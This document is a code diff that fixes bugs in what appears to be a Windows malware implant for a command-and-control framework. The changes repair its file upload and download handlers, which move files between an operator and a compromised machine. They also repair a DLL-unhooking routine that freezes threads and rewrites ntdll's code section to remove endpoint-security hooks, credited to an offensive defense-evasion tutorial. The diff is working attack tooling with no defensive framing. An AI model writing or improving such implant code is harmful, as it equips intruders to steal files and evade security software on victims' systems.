@@ -33,6 +33,11 @@ int track_job(HANDLE* job_thread, struct jobs_t* jobs) {
     return next_free_slot;
 }
 
+uint32_t calc_percentage(int num, int denom) {
+    uint64_t temp = num * 100;
+    return (uint32_t)(temp / denom);
+}
+
 void untrack_job(HANDLE* job_thread, struct jobs_t* jobs) {
     int cur_slot = 0;
 
@@ -218,13 +223,14 @@ int implant_upload(struct wrkr_trans_t* trans, struct upload_req_t* req) {
     msg.msg_enum = UPLOAD;
     msg.upload.msg_enum = RES;
     
-    if (file_handle != 0)
-        msg.upload.res.allowed = 1;
-    else
+    if (file_handle == INVALID_HANDLE_VALUE) {
         msg.upload.res.allowed = 0;
-
-    tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
-    if (file_handle != 0) return -1;
+        tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
+        return -1;
+    } else {
+        msg.upload.res.allowed = 1;
+        tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
+    }
 
     int64_t total_recvd = 0;
     int64_t total_size = req->file_len;
@@ -232,6 +238,8 @@ int implant_upload(struct wrkr_trans_t* trans, struct upload_req_t* req) {
     int recvd = 0;
     int written = 0;
     char temp_buf[255];
+
+    tremont_opts_stream(stream_id, OPT_NONBLOCK, 1, nexus);
 
     while (total_recvd < total_size) {
         recvd = tremont_recv(stream_id,
@@ -283,15 +291,18 @@ int implant_download(struct wrkr_trans_t* trans, struct download_req_t* req) {
 
     int64_t total_size = 0;
 
-    if (file_handle != 0) {
+    if (file_handle == INVALID_HANDLE_VALUE) {
+        msg.upload.res.allowed = 0;
+        msg.download.res.file_len = -1;
+        tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
+        return -1;
+    }
+    else {
         GetFileSizeEx(file_handle, (PLARGE_INTEGER)&total_size);
         msg.download.res.allowed = 1;
         msg.download.res.file_len = total_size;
+        tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
     }
-    else msg.upload.res.allowed = 0;
-
-    tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
-    if (file_handle != 0) return -1;
 
     int64_t total_sent = 0;
     int sent = 0;
@@ -301,8 +312,8 @@ int implant_download(struct wrkr_trans_t* trans, struct download_req_t* req) {
     while (total_sent < total_size) {
         ReadFile(file_handle, temp_buf, 
             sizeof(temp_buf), &read, 0);
-        sent = tremont_recv(stream_id,
-            (byte*)temp_buf, sizeof(temp_buf), nexus);
+        sent = tremont_send(stream_id,
+            (byte*)temp_buf, read, nexus);
         total_sent += sent;
     }
 
@@ -331,8 +342,12 @@ void _freeze_all_other_threads() {
     thread_entry.dwSize = sizeof(thread_entry);
     Thread32First(snapshot, &thread_entry);
 
+    int process_id;
+    process_id = GetCurrentProcessId();
+
     do {
         if (thread_entry.th32ThreadID == my_thread_id) continue;
+        if (thread_entry.th32OwnerProcessID != process_id) continue;
 
         HANDLE thread_handle;
         thread_handle = OpenThread(THREAD_ALL_ACCESS,
@@ -359,8 +374,12 @@ void _unfreeze_all_other_threads() {
     thread_entry.dwSize = sizeof(thread_entry);
     Thread32First(snapshot, &thread_entry);
 
+    int process_id;
+    process_id = GetCurrentProcessId();
+
     do {
         if (thread_entry.th32ThreadID == my_thread_id) continue;
+        if (thread_entry.th32OwnerProcessID != process_id) continue;
 
         HANDLE thread_handle;
         thread_handle = OpenThread(THREAD_ALL_ACCESS,
@@ -378,6 +397,14 @@ void _unfreeze_all_other_threads() {
 
 //based off of https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
 int implant_unhookl(struct wrkr_trans_t* trans, struct unhookl_req_t* req) {
+    struct wrkr_msg_t msg;
+    msg.msg_enum = UNHOOK_L;
+    msg.upload.msg_enum = RES;
+    msg.upload.res.allowed = 1;
+    
+    tremont_send(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
     _freeze_all_other_threads();
 
     MODULEINFO module_info;
@@ -422,7 +449,7 @@ int implant_unhookl(struct wrkr_trans_t* trans, struct unhookl_req_t* req) {
             ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)
         );
 
-        if (!strncmp(section_header->Name, ".text", 5)) continue;
+        if (strncmp(section_header->Name, ".text", 5)) continue;
         
         BOOL is_protected;
         uint32_t old_protection;
@@ -442,7 +469,7 @@ int implant_unhookl(struct wrkr_trans_t* trans, struct unhookl_req_t* req) {
         is_protected = VirtualProtect(
             running_text_section,
             size_of_text,
-            PAGE_READWRITE,
+            PAGE_EXECUTE_READWRITE,
             &old_protection
         );
         
@@ -458,10 +485,9 @@ int implant_unhookl(struct wrkr_trans_t* trans, struct unhookl_req_t* req) {
 
     _unfreeze_all_other_threads();
     CloseHandle(process_handle);
-    CloseHandle(ntdll_module);
     CloseHandle(ntdll_file);
 
-    struct wrkr_msg_t msg;
+    memset(&msg, 0, sizeof(msg));
     msg.msg_enum = UNHOOK_L;
     msg.upload.msg_enum = FIN;
     msg.upload.fin.sanity = 1;
@@ -470,7 +496,7 @@ int implant_unhookl(struct wrkr_trans_t* trans, struct unhookl_req_t* req) {
         sizeof(msg), trans->nexus);
 
     memset(&msg, 0, sizeof(msg));
-    tremont_send(trans->stream_id, (byte*)&msg,
+    tremont_recv(trans->stream_id, (byte*)&msg,
         sizeof(msg), trans->nexus);
 
     tremont_end_stream(trans->stream_id, trans->nexus);
@@ -480,7 +506,6 @@ int implant_unhookl(struct wrkr_trans_t* trans, struct unhookl_req_t* req) {
 ERR:
     _unfreeze_all_other_threads();
     CloseHandle(process_handle);
-    CloseHandle(ntdll_module);
     CloseHandle(ntdll_file);
     tremont_end_stream(trans->stream_id, trans->nexus);
     return -1;
